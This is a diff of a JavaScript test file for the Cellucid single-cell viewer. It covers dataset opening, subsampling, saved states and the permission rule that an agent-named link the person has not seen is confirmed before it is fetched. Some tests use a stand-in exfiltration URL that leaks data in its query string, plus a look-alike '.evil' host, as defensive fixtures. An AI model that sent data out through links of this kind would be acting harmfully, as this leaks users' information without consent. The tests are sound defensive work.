@@ -18,6 +18,11 @@ import { installDatasetOpenActions, linkProblemOf } from '../assets/js/app/ui/mo
 import { mcpToolOf } from '../assets/js/app/agent/bridge/mcp-tools.js';
 import { catalogDocument } from '../assets/js/app/actions/catalog.js';
 import { wholeFileOf } from '../assets/js/data/whole-download.js';
+import { resetCellSubsetRequests, takeCellSubsetRequest } from '../assets/js/data/cell-subset-policy.js';
+import { cellsToOpenRequestOf } from '../assets/js/app/actions/targets/cells-to-open.js';
+import { forgetSeenAddresses, isSeenAddress, noteSeenAddress, noteSeenAddressesIn } from '../assets/js/app/ui/modules/seen-addresses.js';
+import { decide, DEFAULT_PERMISSIONS, PERMISSION_MODES, normalizePermissions, permissionsForAgent } from '../assets/js/app/agent/presence/permissions.js';
+import { mcpToolsOf } from '../assets/js/app/agent/bridge/mcp-tools.js';
 
 const SAMPLES = Object.freeze([
   { id: 'suo', name: 'Developing human immune system (Suo)', cells: 561947, genes: 5103 },
@@ -39,7 +44,7 @@ const MINE = Object.freeze([
   entry('id-file', 'retina.h5ad', { kind: 'file', dataset: 'local:retina', name: 'retina.h5ad' }),
 ]);
 
-const notALink = text => (/^(https?:\/\/|GSE\d+$)/.test(text) ? null : `Cellucid does not recognise "${text}".`);
+const notALink = text => (/^(https?:\/\/|GSE\d+$)/.test(text) ? null : `Cellucid does not recognize "${text}".`);
 
 test('a name is compared without case, spacing or punctuation, exactly first, then by its words', () => {
   assert.equal(comparableName('  Pancreatic   endocrinogenesis (scVelo) '), 'pancreatic endocrinogenesis scvelo');
@@ -80,7 +85,7 @@ test('a kind narrows where the name is looked for, and says what there is there'
   assert.throws(() => resolveDatasetName('My lung atlas', { ...where, kind: 'sample' }), /There is no sample "My lung atlas": the samples are /);
   assert.throws(() => resolveDatasetName('pancreas', { ...where, kind: 'my-datasets' }), /No dataset in My datasets is called "pancreas": /);
   assert.throws(() => resolveDatasetName('x', { ...where, mine: [], kind: 'my-datasets' }), /My datasets is empty in this browser\.$/);
-  assert.throws(() => resolveDatasetName('pancreas', { ...where, kind: 'link' }), /Cellucid does not recognise "pancreas"/);
+  assert.throws(() => resolveDatasetName('pancreas', { ...where, kind: 'link' }), /Cellucid does not recognize "pancreas"/);
   assert.deepEqual(resolveDatasetName('GSE1', { ...where, kind: 'link' }), { kind: 'link', value: 'GSE1' });
 });
 
@@ -88,7 +93,7 @@ test('the link box decides what is a link: an accession and a web address are, a
   assert.equal(linkProblemOf('GSE123456'), null);
   assert.equal(linkProblemOf('https://example.org/data.h5ad'), null);
   assert.equal(linkProblemOf('localhost:8765'), null);
-  assert.match(linkProblemOf('zebrafish'), /does not recognise "zebrafish"/);
+  assert.match(linkProblemOf('zebrafish'), /does not recognize "zebrafish"/);
   assert.match(linkProblemOf('localhost:99999'), /is not a port/);
 });
 
@@ -105,7 +110,8 @@ test('opening a dataset is stepless, asks only once its cost is known, and is a 
   assert.deepEqual(tool.annotations, {
     title: 'Open a dataset', readOnlyHint: false, destructiveHint: true, idempotentHint: false, openWorldHint: true,
   });
-  assert.match(tool.description, /Replaces the open dataset, whose history stays kept in this browser \(Undo does not bring it back\); records no step\. Cellucid asks the person before a large download starts\.$/);
+  // Whether the download is asked is the person's setting, told apart (L26-9).
+  assert.match(tool.description, /Replaces the open dataset, whose history stays kept in this browser \(Undo does not bring it back\); records no step\.$/);
   const list = mcpToolOf(document.actions.find(action => action.type === 'datasets.list'));
   assert.equal(list.annotations.readOnlyHint, true);
   assert.throws(() => defineAction({ ...definition, confirm: null, confirmAt: 'handler' }), /says when to ask \(confirmAt\) but asks about nothing/);
@@ -147,7 +153,7 @@ test('a handler asks the person through the confirmer with what it costs; only a
     asked.push({ type: request.definition.type, stage: request.stage, confirm: request.confirm, detail: request.detail, agent: request.meta.agent });
     return request.stage === 'start' ? true : answer;
   });
-  assert.deepEqual((await dispatcher.dispatch('thing.open', {}, { origin: 'agent', agent: 'Claude' })), { outcome: { opened: true }, step: null });
+  assert.deepEqual((await dispatcher.dispatch('thing.open', {}, { origin: 'agent', agent: 'Claude' })), { outcome: { opened: true }, step: null, unrecorded: null });
   assert.deepEqual(asked, [
     { type: 'thing.open', stage: 'start', confirm: null, detail: null, agent: 'Claude' },
     { type: 'thing.open', stage: 'handler', confirm: 'large-download', detail: 'It downloads 2 GB.', agent: 'Claude' },
@@ -169,19 +175,24 @@ test('a notebook does not open datasets in its viewer: the action is refused wit
     catalog: getActionCatalog(),
     dispatch: async (...args) => { dispatched.push(args); return { outcome: null, step: null }; },
   };
-  for (const [language, how] of [['python', /Python shows another dataset with show_anndata\(\) or serve_anndata\(\)\.$/], ['r', /R shows another dataset with cellucid_view\(\)\.$/]]) {
+  for (const [runtime, name, how] of [
+    ['jupyter', 'the notebook', /Python shows another dataset with show_anndata\(\) or serve_anndata\(\)\.$/],
+    ['cellucid-serve', 'the cellucid serve command', /Python shows another dataset with show_anndata\(\) or serve_anndata\(\)\.$/],
+    ['r', 'the R session', /R shows another dataset with cellucid_view\(\)\.$/],
+  ]) {
     const { handleAction } = createViewerHostCommandHandlers({
-      getShownHostDataset: () => 'served', getHostLabel: () => language, getHostLanguage: () => language, actions,
+      getShownHostDataset: () => 'served', getHostRuntime: () => runtime, actions,
       loadSession: async () => { throw new Error('No session is loaded here.'); },
     });
     await assert.rejects(handleAction({ action: 'dataset.open', params: { name: 'pancreas' } }),
-      error => /^"dataset\.open" is not carried out from a notebook: this viewer shows the dataset its notebook serves, and /.test(error.message) && how.test(error.message));
+      error => error.message.startsWith(`"dataset.open" is not carried out from ${name}: this viewer shows the dataset ${name} serves, and `)
+        && how.test(error.message));
   }
   assert.equal(dispatched.length, 0);
 });
 
 /** The Open data controls, a data source manager, an opening progress and the page's lists, all fake. */
-function page({ current = null, mine = MINE, granted = true, kept = true } = {}) {
+function page({ current = null, mine = MINE, granted = true, kept = true, saved = null } = {}) {
   const calls = [];
   const listeners = new Set();
   let snapshot = null;
@@ -244,6 +255,7 @@ function page({ current = null, mine = MINE, granted = true, kept = true } = {})
     actions: dispatcher, dataSourceManager, state, datasetControls,
     listMine: async () => mine, listSaved: async () => [{ dataset: { id: 'pancreas' } }, { dataset: { id: 'pancreas' }, current: true }],
     opening,
+    savedHistories: () => (saved === null ? null : saved({ datasetControls, calls })),
   });
   return { dispatcher, calls, opening, remove, set onOpening(fn) { onOpening = fn; } };
 }
@@ -287,6 +299,8 @@ test('a dataset of My datasets opens as its menu opens it; a file only where the
 test('a link opens as the address bar opens it; its failure is the opening\'s own sentence', async t => {
   const p = page();
   t.after(p.remove);
+  // The person allows the links the agent names (asked: they were not seen in this tab, F121).
+  p.dispatcher.setConfirmer(() => true);
   const { outcome } = await p.dispatcher.dispatch('dataset.open', { name: 'GSE123456' }, { origin: 'agent', agent: 'Claude' });
   assert.deepEqual(p.calls, [['address', 'GSE123456']]);
   assert.equal(outcome.kind, 'link');
@@ -301,7 +315,60 @@ test('a link opens as the address bar opens it; its failure is the opening\'s ow
     return false;
   };
   await assert.rejects(p.dispatcher.dispatch('dataset.open', { name: 'pancreas', kind: 'sample' }, { origin: 'agent', agent: 'Claude' }),
-    error => error.code === 'cancelled' && /cancelled opening "Pancreatic endocrinogenesis \(scVelo\)"; the dataset shown stays\.$/.test(error.message));
+    error => error.code === 'canceled' && /canceled opening "Pancreatic endocrinogenesis \(scVelo\)"; the dataset shown stays\.$/.test(error.message));
+});
+
+test('a count or fraction opens that subsample at once, read once, as cells.open takes it; the tab\'s choice stays', async t => {
+  resetCellSubsetRequests();
+  const p = page();
+  t.after(() => { p.remove(); resetCellSubsetRequests(); });
+  // What each opening takes as its reader would (`anndata-reader-client.js`).
+  const taken = [];
+  p.onOpening = () => { taken.push(takeCellSubsetRequest()); return true; };
+  const { outcome } = await p.dispatcher.dispatch('dataset.open', { name: 'suo', fraction: 0.1 }, { origin: 'agent', agent: 'Claude' });
+  assert.equal(outcome.already_open, false);
+  assert.deepEqual(p.calls, [['source', { kind: 'sample', dataset: 'suo' }]]);
+  assert.deepEqual(taken, [{ mode: 'subsample', fraction: 0.1, strict: true }]);
+  // An exact count with its method; a stratified one with its field; a fraction of 1 is every cell.
+  await p.dispatcher.dispatch('dataset.open', { name: 'he', count: 5000, method: 'blocks', seed: 7 }, { origin: 'agent', agent: 'Claude' });
+  await p.dispatcher.dispatch('dataset.open', { name: 'My lung atlas', count: 200, method: 'stratified', field: 'cell_type', allocation: 'balanced' }, { origin: 'agent', agent: 'Claude' });
+  await p.dispatcher.dispatch('dataset.open', { name: 'heart', fraction: 1 }, { origin: 'agent', agent: 'Claude' });
+  assert.deepEqual(taken.slice(1), [
+    { mode: 'subsample', method: 'blocks', seed: 7, k: 5000, strict: true },
+    { mode: 'subsample', method: 'stratified', field: 'cell_type', allocation: 'balanced', k: 200, strict: true },
+    { mode: 'all' },
+  ]);
+  // Named nothing: the tab's request, which the asked cells never replaced.
+  await p.dispatcher.dispatch('dataset.open', { name: 'pancreas' }, { origin: 'agent', agent: 'Claude' });
+  assert.deepEqual(taken.at(-1), { mode: 'auto' });
+  // The words of the turn and its pseudocode name the share.
+  const definition = getActionCatalog().get('dataset.open');
+  assert.equal(definition.describe({ name: 'suo', kind: 'any', fraction: 0.1, method: null, seed: null }), 'Opened suo with 10% of the cells');
+  assert.equal(definition.code({ name: 'suo', kind: 'any', count: 5000, method: 'blocks', seed: null }), 'open_dataset("suo", count=5000, method="blocks")');
+});
+
+test('the cells asked for are checked as cells.open checks them, before anything opens; an open dataset names cells_open', async t => {
+  resetCellSubsetRequests();
+  const p = page();
+  t.after(() => { p.remove(); resetCellSubsetRequests(); });
+  const refused = async (params, pattern) => {
+    await assert.rejects(p.dispatcher.dispatch('dataset.open', { name: 'suo', ...params }, { origin: 'agent', agent: 'Claude' }),
+      error => error.code === 'bad-params' && pattern.test(error.message));
+  };
+  await refused({ count: 10, fraction: 0.1 }, /^Give how many cells to open as count or as fraction, not both\.$/);
+  await refused({ count: 1 }, /^Open at least 2 cells: one cell has no coordinate variation to draw\.$/);
+  await refused({ count: 100, method: 'stratified' }, /names the categorical column it is stratified by \(field\)\.$/);
+  await refused({ method: 'blocks', seed: 3 }, /^A subsample names how many cells to open \(count, or fraction\) beside its method and seed\.$/);
+  assert.deepEqual(p.calls, []);
+  // The same sentences refuse cells.open's.
+  assert.throws(() => cellsToOpenRequestOf({ count: 1, method: null, seed: null, allocation: 'proportional' }, 100), { message: 'Open at least 2 cells: one cell has no coordinate variation to draw.' });
+  assert.deepEqual(cellsToOpenRequestOf({ fraction: 0.25, method: null, seed: null, allocation: 'proportional' }, 100), { mode: 'subsample', k: 25, strict: true });
+  assert.deepEqual(cellsToOpenRequestOf({ count: 100, method: null, seed: null, allocation: 'proportional' }, 100), { mode: 'all' });
+  await p.dispatcher.dispatch('dataset.open', { name: 'pancreas' }, { origin: 'agent', agent: 'Claude' });
+  await assert.rejects(p.dispatcher.dispatch('dataset.open', { name: 'pancreas', fraction: 0.5 }, { origin: 'agent', agent: 'Claude' }),
+    error => error.code === 'already-open' && error.message === '"Pancreatic endocrinogenesis (scVelo)" is open already: cells_open reads it again with other cells.');
+  // Open already and asked for nothing more: its history goes on.
+  assert.equal((await p.dispatcher.dispatch('dataset.open', { name: 'pancreas' }, { origin: 'agent', agent: 'Claude' })).outcome.already_open, true);
 });
 
 test('a whole-file download of the agent\'s own opening is asked about with its size; declined, nothing opens', async t => {
@@ -310,8 +377,9 @@ test('a whole-file download of the agent\'s own opening is asked about with its 
   const asked = [];
   let yes = true;
   // Asked about the download by the opening itself (the start's question is the person's permissions).
-  p.dispatcher.setConfirmer(({ detail, stage }) => {
-    if (stage === 'start') return true;
+  p.dispatcher.setConfirmer(({ detail, stage, confirm }) => {
+    // The start's question is the person's permissions; the link, not seen in this tab, is allowed (F121).
+    if (stage === 'start' || confirm === 'unseen-link') return true;
     asked.push(detail);
     return yes;
   });
@@ -364,7 +432,7 @@ test('an agent\'s action names its connection; the person being asked is heard b
     asking();
     return answer;
   });
-  const connection = { id: 'g1', kind: 'connector', client: 'Claude Code', host: 'claude.ai' };
+  const connection = { id: 'g1', kind: 'connector', client: 'Claude Code', host: 'claude.ai', known: true };
   const { outcome } = await dispatcher.dispatch('thing.open', {}, { origin: 'agent', agent: 'Claude', connection });
   assert.deepEqual(outcome.connection, connection);
   assert.deepEqual(events.map(event => [event.kind, event.detail ?? null, event.allowed ?? null, event.meta.connection.id]), [
@@ -377,4 +445,256 @@ test('an agent\'s action names its connection; the person being asked is heard b
   assert.equal((await dispatcher.dispatch('thing.open', {}, { origin: 'user', connection })).outcome.connection, null);
   await assert.rejects(dispatcher.dispatch('thing.open', {}, { origin: 'agent', agent: 'Claude', connection: { id: '', kind: 'connector' } }), /names its id and kind/);
   await assert.rejects(dispatcher.dispatch('thing.open', {}, { origin: 'agent', agent: 'Claude', connection: { id: 'g', kind: 'email' } }), /names its id and kind/);
+});
+
+// --- history.saved.open (F114): Load…'s Open as an action ---------------------
+
+const STATES = Object.freeze([
+  { id: 'state-he', kind: 'autosave', name: null, lastStep: 'Colored by gene SFTPC', dataset: { id: 'he', name: 'Developing human lung (He)' }, steps: 12, openable: true },
+  { id: 'state-shown', kind: 'autosave', name: null, lastStep: null, dataset: { id: 'pancreas', name: 'Pancreatic endocrinogenesis (scVelo)' }, steps: 3, openable: true, current: true },
+  { id: 'state-old', kind: 'named', name: 'Old work', lastStep: null, dataset: { id: 'he', name: 'Developing human lung (He)' }, steps: 4, openable: false },
+]);
+
+/** Saved states whose Open opens the He sample (its dataset first), then answers `outcome`. */
+function savedStates(outcome = { opened: true, problem: null, code: null }, opened = []) {
+  return ({ datasetControls }) => ({
+    list: async () => STATES,
+    async open(id) {
+      opened.push(id);
+      if (!await datasetControls.openDatasetSource({ kind: 'sample', dataset: 'he' })) return { opened: false, problem: null, code: null };
+      return outcome;
+    },
+  });
+}
+
+const AGENT = Object.freeze({ origin: 'agent', agent: 'Claude' });
+const PANCREAS_SHOWN = Object.freeze({ sourceType: 'local-demo', id: 'pancreas', name: 'Pancreatic endocrinogenesis (scVelo)', identity: 'pancreas', cells: 9 });
+
+test('opening a saved state is Load\'s Open as a stepless dataset action, asked only for a large download, refused from a notebook', async () => {
+  const definition = getActionCatalog().get('history.saved.open');
+  assert.equal(definition.effect, 'dataset');
+  assert.equal(definition.confirm, 'large-download');
+  assert.equal(definition.confirmAt, 'handler');
+  assert.deepEqual(definition.touches, []);
+  const tool = mcpToolOf(catalogDocument(getActionCatalog()).actions.find(action => action.type === 'history.saved.open'));
+  assert.equal(tool.name, 'history_saved_open');
+  assert.match(tool.description, /to continue it, as Load…'s Open does: its dataset first when another is shown .*use history_replay\./);
+  const dispatched = [];
+  const { handleAction } = createViewerHostCommandHandlers({
+    getShownHostDataset: () => 'served', getHostRuntime: () => 'jupyter',
+    actions: { catalog: getActionCatalog(), dispatch: async (...args) => { dispatched.push(args); return { outcome: null, step: null }; } },
+    loadSession: async () => { throw new Error('No session is loaded here.'); },
+  });
+  await assert.rejects(handleAction({ action: 'history.saved.open', params: { saved: 'state-he' } }),
+    error => /^"history\.saved\.open" is not carried out from the notebook/.test(error.message));
+  assert.equal(dispatched.length, 0);
+});
+
+test('a saved state of another dataset opens its dataset first, then its history, and says so', async t => {
+  const opened = [];
+  const p = page({ current: PANCREAS_SHOWN, saved: savedStates(undefined, opened) });
+  t.after(p.remove);
+  const { outcome, step } = await p.dispatcher.dispatch('history.saved.open', { saved: 'state-he' }, AGENT);
+  assert.equal(step, null);
+  assert.deepEqual(opened, ['state-he']);
+  assert.deepEqual(p.calls, [['source', { kind: 'sample', dataset: 'he' }]]);
+  assert.deepEqual(outcome, {
+    saved: 'state-he', name: null, dataset: 'Developing human lung (He)', steps: 12, dataset_opened: true, already_shown: false,
+    not_restored: null,
+  });
+});
+
+test('a saved state opened but for a part tells the agent which part, in the words the person was told (F155)', async t => {
+  const said = 'Session restored but for 1 part. Expression values could not be restored: it was saved by an earlier version of Cellucid (0.9.7), and this version cannot read this part. It is left as it was shown.';
+  const p = page({ current: PANCREAS_SHOWN, saved: savedStates({ opened: true, problem: null, code: null, notRestored: said }) });
+  t.after(p.remove);
+  const { outcome } = await p.dispatcher.dispatch('history.saved.open', { saved: 'state-he' }, AGENT);
+  assert.equal(outcome.not_restored, said);
+});
+
+test('the history shown goes on; an unknown or unopenable saved state is refused before anything opens', async t => {
+  const opened = [];
+  const p = page({ current: PANCREAS_SHOWN, saved: savedStates(undefined, opened) });
+  const { outcome } = await p.dispatcher.dispatch('history.saved.open', { saved: 'state-shown' }, AGENT);
+  assert.deepEqual(outcome, {
+    saved: 'state-shown', name: null, dataset: 'Pancreatic endocrinogenesis (scVelo)', steps: 3, dataset_opened: false, already_shown: true,
+    not_restored: null,
+  });
+  await assert.rejects(p.dispatcher.dispatch('history.saved.open', { saved: 'state-9' }, AGENT),
+    error => error.code === 'no-target'
+      && error.message === 'No saved state of this browser has the id "state-9"; the saved states are "state-he", "state-shown", "state-old" (history_saved_list).');
+  await assert.rejects(p.dispatcher.dispatch('history.saved.open', { saved: 'state-old' }, AGENT),
+    error => error.code === 'unopenable' && error.message === '"Old work" was kept by another version of Cellucid, which this version cannot open or replay.');
+  assert.deepEqual(opened, []);
+  p.remove();
+  const none = page({ saved: () => null });
+  t.after(none.remove);
+  await assert.rejects(none.dispatcher.dispatch('history.saved.open', { saved: 'state-he' }, AGENT), error => error.code === 'unavailable');
+});
+
+test('a saved state not opened is refused with why: the person to reopen its file, its load\'s failure, its opening\'s', async t => {
+  const reopen = page({ current: PANCREAS_SHOWN, saved: savedStates({
+    opened: false, code: 'needs-person',
+    problem: 'It was saved on "retina.h5ad", opened from this computer, which the browser lets only the person read again: the page now offers them "Reopen retina.h5ad", after which it opens.',
+  }) });
+  await assert.rejects(reopen.dispatcher.dispatch('history.saved.open', { saved: 'state-he' }, AGENT),
+    error => error.code === 'needs-person'
+      && /^The autosave at "Colored by gene SFTPC" was not opened\. It was saved on "retina\.h5ad", .*"Reopen retina\.h5ad", after which it opens\.$/.test(error.message));
+  reopen.remove();
+  const failed = page({ current: PANCREAS_SHOWN, saved: savedStates({ opened: false, code: 'failed', problem: 'The file is damaged, so it was not opened; the history shown is unchanged.' }) });
+  await assert.rejects(failed.dispatcher.dispatch('history.saved.open', { saved: 'state-he' }, AGENT),
+    error => error.code === 'failed' && /was not opened\. The file is damaged/.test(error.message));
+  failed.remove();
+  // Its dataset could not be read: said by its opening, as dataset.open says it.
+  const unread = page({ current: PANCREAS_SHOWN, saved: savedStates() });
+  unread.onOpening = async () => { unread.opening.end('failed', 'the host answered 500'); return false; };
+  await assert.rejects(unread.dispatcher.dispatch('history.saved.open', { saved: 'state-he' }, AGENT),
+    error => error.code === 'failed' && error.message === 'The autosave at "Colored by gene SFTPC" could not be opened: the host answered 500');
+  unread.remove();
+});
+
+test('a whole-file download of a saved state\'s dataset is asked about as the agent\'s opening; declined, nothing opens', async t => {
+  const p = page({ current: PANCREAS_SHOWN, saved: savedStates() });
+  t.after(p.remove);
+  const asked = [];
+  p.dispatcher.setConfirmer(({ detail, stage }) => {
+    if (stage === 'start') return true;
+    asked.push(detail);
+    return false;
+  });
+  const resource = { url: 'https://slow.example/he.h5ad', name: 'he.h5ad', size: 2_500_000_000, identity: null };
+  p.onOpening = async () => {
+    try {
+      await wholeFileOf(resource, { opening: { step() {}, notice() {} }, signal: AbortSignal.abort() });
+    } catch (error) {
+      if (error?.name === 'AbortError' && error.kind === 'user') return false;
+    }
+    return true;
+  };
+  await assert.rejects(p.dispatcher.dispatch('history.saved.open', { saved: 'state-he' }, AGENT),
+    error => error.code === 'declined' && error.message === 'The person declined the download, so the autosave at "Colored by gene SFTPC" was not opened.');
+  assert.equal(asked.length, 1);
+  assert.match(asked[0], /^It downloads the whole file he\.h5ad \(2\.3 GB\) into this browser: /);
+});
+
+// ---- F121: a link the person has not seen in this tab is asked about first ----------------
+
+test('F121: an agent\'s link the person has not seen in this tab is asked about before anything is requested; declined, nothing is fetched', async t => {
+  forgetSeenAddresses();
+  t.after(forgetSeenAddresses);
+  const p = page();
+  t.after(p.remove);
+  const questions = [];
+  let answer = false;
+  p.dispatcher.setConfirmer(question => {
+    if (question.stage === 'start') return true;
+    // Asked before the tab requests anything of the address.
+    questions.push({ confirm: question.confirm, detail: question.detail, calls: p.calls.length });
+    return answer;
+  });
+  const exfiltrating = 'https://collect.example/?q=the-lung-atlas-markers';
+  await assert.rejects(p.dispatcher.dispatch('dataset.open', { name: exfiltrating }, { origin: 'agent', agent: 'Claude' }),
+    error => error instanceof ActionRefused && error.code === 'declined');
+  assert.deepEqual(p.calls, [], 'declined: the address was never requested');
+  assert.equal(questions.length, 1);
+  assert.equal(questions[0].confirm, 'unseen-link');
+  assert.equal(questions[0].calls, 0);
+  assert.match(questions[0].detail, /^It opens .*collect\.example\/\?q=the-lung-atlas-markers.*, an address not typed, pasted or opened in this tab before\.$/);
+  // An accession and a server are addresses too.
+  for (const name of ['GSE999999', 'localhost:9999']) {
+    await assert.rejects(p.dispatcher.dispatch('dataset.open', { name }, { origin: 'agent', agent: 'Claude' }), error => error.code === 'declined');
+  }
+  assert.deepEqual(p.calls, []);
+  assert.equal(questions.length, 3);
+  // Allowed: it opens.
+  answer = true;
+  await p.dispatcher.dispatch('dataset.open', { name: exfiltrating }, { origin: 'agent', agent: 'Claude' });
+  assert.deepEqual(p.calls, [['address', exfiltrating]]);
+});
+
+test('F121: a link the person typed or pasted, one open now and one of My datasets open without asking; samples and their datasets are never asked', async t => {
+  forgetSeenAddresses();
+  t.after(forgetSeenAddresses);
+  const p = page({ current: { sourceType: 'link', id: 'url:open', name: 'Open now', identity: 'id-open', cells: 50 } });
+  t.after(p.remove);
+  const questions = [];
+  p.dispatcher.setConfirmer(question => {
+    if (question.stage !== 'start') questions.push(question.confirm);
+    return true;
+  });
+  // Typed in the address bar (submitted), or written in the chat by the person.
+  noteSeenAddress('https://typed.example/atlas.h5ad');
+  noteSeenAddressesIn('Please open GSE123456, and also <https://pasted.example/data.zarr>.');
+  for (const name of ['https://typed.example/atlas.h5ad', 'GSE123456', 'https://pasted.example/data.zarr', 'https://example.org/lung.h5ad', 'pancreas', 'My lung atlas']) {
+    await p.dispatcher.dispatch('dataset.open', { name }, { origin: 'agent', agent: 'Claude' }).catch(() => {});
+  }
+  assert.deepEqual(questions, [], 'nothing the person has seen here is asked about');
+  // Seen means exactly that address: another query, path or host is another address.
+  for (const name of ['https://typed.example/atlas.h5ad?x=1', 'https://typed.example/other.h5ad', 'https://typed.example.evil/atlas.h5ad']) {
+    await p.dispatcher.dispatch('dataset.open', { name }, { origin: 'agent', agent: 'Claude' }).catch(() => {});
+  }
+  assert.deepEqual(questions, ['unseen-link', 'unseen-link', 'unseen-link']);
+  // The person (and a notebook, which acts for them) is never asked.
+  questions.length = 0;
+  await p.dispatcher.dispatch('dataset.open', { name: 'https://new.example/x.h5ad' }, { origin: 'user' }).catch(() => {});
+  assert.deepEqual(questions, []);
+});
+
+test('F121: the open dataset\'s own link is seen; spellings of one address are one', () => {
+  forgetSeenAddresses();
+  noteSeenAddress('  https://EXAMPLE.org:443/a.h5ad  ');
+  assert.equal(isSeenAddress('https://example.org/a.h5ad'), true);
+  assert.equal(isSeenAddress('https://example.org/a.h5ad#x'), false);
+  noteSeenAddress('8765');
+  assert.equal(isSeenAddress('localhost:8765'), true);
+  assert.equal(isSeenAddress('http://localhost:8765'), true);
+  assert.equal(isSeenAddress('https://shown.example/b.zarr', ['https://shown.example/b.zarr']), true);
+  assert.equal(isSeenAddress('', ['']), false);
+  forgetSeenAddresses();
+  assert.equal(isSeenAddress('https://example.org/a.h5ad'), false);
+});
+
+test('F121: the permission kind is asked in every preset that runs anything, refused read-only; the tool says the rule, the agent is told the setting', () => {
+  const question = { meta: { origin: 'agent', agent: 'Claude' }, confirm: 'unseen-link', stage: 'handler' };
+  assert.equal(decide(question, DEFAULT_PERMISSIONS).decision, 'ask');
+  assert.equal(decide(question, { kinds: PERMISSION_MODES['allow-undoable'].kinds }).decision, 'ask');
+  assert.equal(decide(question, { kinds: PERMISSION_MODES['read-only'].kinds }).decision, 'deny');
+  assert.equal(normalizePermissions({ kinds: { change: 'allow' } }).kinds['unseen-link'], 'ask', 'settings kept before the kind existed ask');
+  const document = catalogDocument(getActionCatalog());
+  const opener = document.actions.find(action => action.type === 'dataset.open');
+  assert.equal(opener.opensLinks, true);
+  assert.deepEqual(document.actions.filter(action => action.opensLinks).map(action => action.type), ['dataset.open']);
+  // The tool list never changes with the settings (L26-9): its description says the rule, the agent is told the setting apart.
+  const tool = mcpToolsOf(document).find(each => each.name === 'dataset_open');
+  assert.match(tool.description, /A link, accession or server the person has not typed, pasted or opened in this tab is asked of them first/);
+  assert.equal(tool.annotations.openWorldHint, true);
+  assert.match(permissionsForAgent(normalizePermissions(null)), /opening links not seen in this tab[^:]*: are asked of the person first/);
+  assert.match(permissionsForAgent(normalizePermissions({ kinds: { 'unseen-link': 'deny' } })), /opening links not seen in this tab: are refused/);
+  assert.throws(() => defineAction({ ...getActionCatalog().get('datasets.list'), confirmAt: undefined, opensLinks: true }), /is a read, which fetches nothing an agent names/);
+});
+
+test('F121: only an opensLinks action may ask about a link, and only an agent\'s is asked', async () => {
+  const catalog = createActionCatalog([
+    defineAction({
+      type: 'thing.fetch', title: 'Fetch a thing', summary: 'Fetches a thing.', group: 'Things',
+      params: { type: 'object', additionalProperties: false, properties: {} },
+      reads: [], effect: 'dataset', opensLinks: true, result: { type: 'object', additionalProperties: false, properties: {} },
+      describe: () => 'Fetched a thing', code: () => 'fetch_thing()',
+    }),
+    defineAction({
+      type: 'thing.other', title: 'Other thing', summary: 'Another.', group: 'Things',
+      params: { type: 'object', additionalProperties: false, properties: {} },
+      reads: [], effect: 'dataset', result: { type: 'object', additionalProperties: false, properties: {} },
+      describe: () => 'Other', code: () => 'other()',
+    }),
+  ]);
+  const dispatcher = createActionDispatcher({ catalog });
+  const asked = [];
+  dispatcher.setConfirmer(question => { if (question.stage !== 'start') asked.push(question.meta.origin); return true; });
+  dispatcher.provide('thing.fetch', async (_params, ctx) => { await ctx.confirmLink('https://x.example/'); return {}; });
+  dispatcher.provide('thing.other', async (_params, ctx) => { await ctx.confirmLink('https://x.example/'); return {}; });
+  await dispatcher.dispatch('thing.fetch', {}, { origin: 'agent', agent: 'Claude' });
+  await dispatcher.dispatch('thing.fetch', {}, { origin: 'host', host: 'python' });
+  assert.deepEqual(asked, ['agent']);
+  await assert.rejects(dispatcher.dispatch('thing.other', {}, { origin: 'agent', agent: 'Claude' }), /fetches no address its parameters name \(opensLinks\)/);
 });
